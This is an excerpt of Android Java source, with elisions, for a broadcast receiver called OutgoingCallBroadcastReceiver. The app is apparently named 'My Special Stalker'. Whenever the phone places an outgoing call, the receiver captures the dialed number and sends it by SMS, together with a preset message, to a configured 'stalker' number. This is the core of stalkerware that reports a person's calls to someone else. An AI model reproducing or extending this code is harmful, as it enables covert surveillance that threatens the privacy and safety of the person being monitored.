...
public class OutgoingCallBroadcastReceiver extends BroadcastReceiver {
    ...
    private static final String NOTIFICATION_TITLE = "My Special Stalker";
    ...
    public void onReceive(Context context, Intent intent) {
        ...
        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction()))
        {
            ...
            {
                String messageToSend = MainActivity.getStalkerMessage() + calledNumber;
                handleNotifications(SENDING_MESSAGE, context);
                sendSMS(MainActivity.getStalkerNumber(), messageToSend, context);
            }
        }
    }
}
